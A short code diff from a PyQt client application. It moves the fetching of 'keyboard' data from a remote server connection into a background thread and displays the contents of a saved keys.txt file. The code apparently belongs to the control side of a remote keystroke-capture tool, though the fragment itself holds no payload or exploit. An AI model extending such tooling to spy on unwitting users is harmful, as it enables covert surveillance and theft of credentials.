@@ -348,21 +348,12 @@ class Client(QtGui.QMainWindow):
 		
 		
 	def requestKeyboard(self, size = 40):
-		self.streamKeyboard(self.__server_connected, size)
+		t = UpdateKeyboard(self.__server_connected,size , self.__manager, self)
+		QtCore.QObject.connect(t, QtCore.SIGNAL(_fromUtf8("update()")), self.streamKeyboard)
+		t.start()
 		
-	def streamKeyboard(self, address, size):
-		socketServer = socket(AF_INET, SOCK_STREAM)
-		try:	
-			socketServer.connect(address)
-		except:
-			print "IP or PORT invalid!!!"
-			return
-		while True:
-			fileKeys = self.__manager.requestKeyboard(socketServer, size)
-			if fileKeys == None:
-				continue
-			self.keyboard.setText(open(fileKeys, "r").read())
-			break
+	def streamKeyboard(self):
+		self.keyboard.setText(open(SAVEDIR + "keys.txt", "r").read())
 	
 	def setImage(self, path):
 		scene = QGraphicsScene()
